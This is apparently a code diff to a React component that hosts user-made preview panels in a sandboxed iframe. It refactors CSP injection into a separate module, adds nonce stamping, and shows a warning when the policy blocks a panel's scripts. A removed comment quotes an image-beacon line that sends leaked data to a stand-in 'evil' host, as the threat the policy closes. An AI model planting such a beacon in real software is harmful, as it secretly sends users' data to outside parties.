@@ -22,6 +22,9 @@
  *   origin，两处都是实际引用面：预览 bundle 无外链图（内置面板的消毒器
  *   只产出 https 远程图——收紧后这类图随 CSP 一起失效降级为空，属安全
  *   收敛的预期取舍））+ connect-src 限平台 origin。
+ *   宿主文档自身的 HTTP 头策略也被 srcdoc 继承：#989 起其 script-src 是
+ *   per-response nonce，bundle 的 <script> 由 panelCsp.ts 盖章放行，inline
+ *   事件属性（onclick=）被拦截并经 csp-violation 探针提示。
  *   所有 origin 都写注入时的绝对值：opaque origin 下 'self' 不匹配任何
  *   URL（CSP3），写了等于没写。
  * - **已知残留**（meta-CSP 框架内无标准修法）：CSP 不治理 iframe 自导航，
@@ -50,62 +53,18 @@ import {
   PREVIEW_HOST_SOURCE,
   type PreviewHostInitMessage,
 } from './bridge'
+import { buildPanelCsp, injectPanelCsp, readDocumentCspNonce } from './panelCsp'
 import styles from './PreviewPanelHost.module.css'
 
 const MIN_HEIGHT = 120
 const MAX_HEIGHT = 6000
 const DEFAULT_HEIGHT = 320
 
-/**
- * 出站网络红线（见文件头）。origin 用注入时的绝对值：opaque origin 下
- * 'self' 不匹配任何 URL（CSP3），写了等于没写——connect/script/style/font
- * 统一拼平台 origin。img-src 同样收敛到 `data:` + 平台 origin（#500
- * P1-4）：预览 bundle 的实际图源只有 data: 内联（单文件 bundle 契约），
- * 放行任意 `https:` 会给 `new Image().src='https://evil/?d='+leak` 留
- * 零门槛 GET 外带通道——与 fetch/sendBeacon 同罪，一并闭合。
- */
-function buildPanelCsp(): string {
-  // 测试（node 环境）与浏览器都取当前 origin；取不到时退化为不含 origin
-  // 白名单的最小策略（脚本/样式 inline 仍可用，平台资产加载会失败——
-  // bundle 契约本就要求资产缺失时自行降级）。
-  const origin = typeof window === 'undefined' ? '' : window.location.origin
-  const withOrigin = origin ? ` ${origin}` : ''
-  return [
-    "default-src 'none'",
-    // 单文件 bundle 的脚本/样式本体就是 inline 的；katex 等平台构建资产按
-    // init.assets 的绝对 URL 加载。
-    `script-src 'unsafe-inline'${withOrigin}`,
-    `style-src 'unsafe-inline'${withOrigin}`,
-    `font-src${withOrigin}`,
-    // data: 内联图（单文件 bundle 的常见模式）；远程图不再放行——远程
-    // 图源是任意外带 URL 的载体，产品取舍见函数头注释。
-    `img-src data:${withOrigin}`,
-    // 面板经桥取数，不需要任何 XHR/fetch；connect-src 收紧到平台 origin，
-    // 堵死 fetch/sendBeacon 外传通道。
-    `connect-src${withOrigin}`,
-    "form-action 'none'",
-  ].join('; ')
-}
-
-/**
- * 把 CSP meta 注入 bundle 文档的真实 <head> 顶部。
- *
- * 落点必须用 DOMParser 按解析器语义定位：正则找 `<head` 会被攻击者文本
- * 抢占——注释（`<!-- <head> -->`）、JS 字符串字面量、属性值里的伪 `<head>`
- * 都能让 meta 落不进真正的 head 元素，整个策略失效（评审 P0）。DOMParser
- * 是 inert 的（不执行脚本、不加载资源），解析-插入-序列化对 bundle 内容
- * 透明。bundle 自带的 CSP meta 若存在只会更严（多策略取交集）。
- * 序列化用 outerHTML 而非 XMLSerializer：保持 HTML 语法（自闭合、实体）。
- */
-function injectCsp(html: string, csp: string): string {
-  const meta = document.createElement('meta')
-  meta.setAttribute('http-equiv', 'Content-Security-Policy')
-  meta.setAttribute('content', csp)
-  const doc = new DOMParser().parseFromString(html, 'text/html')
-  // 无 <head> 时 DOMParser 会隐式建一个（如纯片段输入），插入仍然成立。
-  doc.head.insertBefore(meta, doc.head.firstChild)
-  return `<!doctype html>${doc.documentElement.outerHTML}`
-}
+// 面板对所有成员可见，提示面向成员（#989）：说明现象 + 找管理员的两条出路。
+const CSP_BLOCKED_HINT =
+  '此面板的部分按钮或交互被安全策略拦截，可能无法使用。请联系管理员：' +
+  '可让 agent 按最新面板规范（用 addEventListener 绑定事件）重写面板，' +
+  '或在「全局设置 → 实例设置 → 安全」中临时开启预览面板兼容模式。'
 
 export interface PreviewPanelHostProps {
   jobId: string
@@ -160,8 +119,16 @@ export function PreviewPanelHost({
     [jobId, theme]
   )
 
-  // CSP 注入结果随 bundle 变化重算（srcDoc 导航见 PreviewPanelSection 的 key）。
-  const framedHtml = useMemo(() => injectCsp(html, buildPanelCsp()), [html])
+  // 面板内脚本被宿主严格 CSP 拦截（多为 inline 事件属性，#989）——提示而
+  // 非静默失效。
+  const [scriptBlocked, setScriptBlocked] = useState(false)
+
+  // CSP 注入 + nonce 盖章随 bundle 变化重算（srcDoc 导航见
+  // PreviewPanelSection 的 key）；nonce 每次页面加载固定，见 panelCsp.ts。
+  const framedHtml = useMemo(
+    () => injectPanelCsp(html, buildPanelCsp(), readDocumentCspNonce()),
+    [html]
+  )
 
   useEffect(() => {
     const signature = (detail?.nodes ?? [])
@@ -246,6 +213,10 @@ export function PreviewPanelHost({
         frame.contentWindow?.postMessage(initMessage, '*')
         return
       }
+      if (data.type === 'csp-violation') {
+        setScriptBlocked(true)
+        return
+      }
       if (data.type === 'resize') {
         setHeight(
           Math.min(MAX_HEIGHT, Math.max(MIN_HEIGHT, Math.round(data.height)))
@@ -262,12 +233,17 @@ export function PreviewPanelHost({
   return (
     <div className={styles.wrapper} data-testid="preview-panel-host">
       {loading && <div className={styles.loading}>预览加载中…</div>}
+      {scriptBlocked && (
+        <div className={styles.cspWarning} role="status">
+          {CSP_BLOCKED_HINT}
+        </div>
+      )}
       <iframe
         ref={iframeRef}
         className={styles.frame}
         title={title ?? '自定义预览面板'}
         // 安全红线见文件头注释：allow-scripts 可授，allow-same-origin 永不授；
-        // 出站网络由注入的 CSP meta 钉死（见 injectCsp）。
+        // 出站网络由注入的 CSP meta 钉死（见 panelCsp.ts）。
         sandbox="allow-scripts"
         srcDoc={framedHtml}
         style={{ height }}
